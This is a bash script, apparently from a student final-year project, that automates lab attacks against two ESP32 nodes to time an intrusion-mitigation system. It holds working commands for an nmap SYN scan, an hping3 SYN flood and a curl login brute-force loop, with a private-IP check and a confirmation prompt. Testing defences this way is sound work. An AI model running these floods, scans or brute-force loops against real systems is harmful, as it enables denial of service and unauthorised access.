#!/usr/bin/env bash
# attack_batch.sh - automated FYP data-collection batch (AUTHORIZED LAB USE ONLY).
# Cycles through all 4 attack types across both ESP32 nodes, spaced so each run
# produces a FRESH mitigation block -> a clean latency sample for Table 4.6.
#
# Usage:
#   ./attack_batch.sh [ROUNDS] [WAIT_SECONDS]
#     ROUNDS        rounds per attack type   (default 3  -> 3 x 4 = 12 runs)
#     WAIT_SECONDS  gap between runs          (default 310, >= block duration)
#
# Fast mode (more samples quickly): temporarily set BLOCK_DURATION_SEC = 20 in
# app.py, restart it, then run:  ./attack_batch.sh 5 25
# (remember to restore BLOCK_DURATION_SEC = 300 afterwards).
set -u

NODE_A='192.168.0.136'      # ESP32 Node A (static IP)
NODE_B='192.168.0.137'      # ESP32 Node B (static IP)
SERVER='100.89.233.26'      # server Tailscale IP (dashboard)
LOGIN_PATH='/login'

ROUNDS="${1:-3}"
WAIT="${2:-310}"
LOG="$HOME/attack_batch.log"

C='\033[1;36m'; G='\033[1;32m'; Y='\033[1;33m'; X='\033[0m'
log(){ printf "[%s] %b\n" "$(date '+%F %T')" "$*" | tee -a "$LOG"; }
priv_ip(){ [[ "$1" =~ ^(10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[01])\.)[0-9.]+$ ]]; }

# safety: only private-LAN targets
for ip in "$NODE_A" "$NODE_B"; do
  [[ -n "$ip" ]] && { priv_ip "$ip" || { echo "Refusing non-private target: $ip"; exit 1; }; }
done

# --- attack functions (same commands as the interactive launcher) ---
a_portscan(){ sudo nmap -sS -Pn -n -T4 -p 1-1000 "$1" >/dev/null 2>&1; }
a_ddos(){ sudo timeout 8s hping3 -S -p 80 --flood "$1" >/dev/null 2>&1 || true; }
a_brute(){ local i; for i in $(seq 1 15); do
  curl -s -o /dev/null -m3 -X POST --data 'username=admin&password=wrongpass' \
    "http://$1$LOGIN_PATH" >/dev/null 2>&1 || true; sleep 0.4; done; }
a_usb(){ local r; for r in 1 2 3; do
  sudo nmap -sS -Pn -n -T4 -p 21,22,23,25,80,135,139,443,445,3389,8080 "$1" >/dev/null 2>&1; done; }

ATTACKS=(a_portscan a_ddos a_brute a_usb)
NAMES=(PortScan DDoS BruteForce USB)
TOTAL=$(( ROUNDS * ${#ATTACKS[@]} ))

printf "${Y}Authorized FYP lab batch:${X} %d runs (%d rounds x %d types), wait=%ss\n" \
  "$TOTAL" "$ROUNDS" "${#ATTACKS[@]}" "$WAIT"
printf "Targets: Node A %s / Node B %s   Dashboard: http://%s:5000\n" "$NODE_A" "$NODE_B" "$SERVER"
read -r -p "Type YES to start: " ans; [[ "$ans" == YES ]] || { echo "Cancelled."; exit 0; }

log "${C}START batch${X}: $TOTAL runs, wait=${WAIT}s"
n=0
for ((round=1; round<=ROUNDS; round++)); do
  for idx in "${!ATTACKS[@]}"; do
    if (( n % 2 == 0 )) || [[ -z "$NODE_B" ]]; then T="$NODE_A"; NODE_LBL="A"; else T="$NODE_B"; NODE_LBL="B"; fi
    n=$((n+1))
    log "run ${n}/${TOTAL}: ${NAMES[$idx]} -> Node ${NODE_LBL} (${T})"
    "${ATTACKS[$idx]}" "$T"
    if (( n < TOTAL )); then
      log "cooldown ${WAIT}s (let the block auto-expire so the next run logs a fresh latency)"
      sleep "$WAIT"
    fi
  done
done
log "${G}DONE batch${X}: $TOTAL runs complete. Now on the server run: python3 chapter4_data.py"
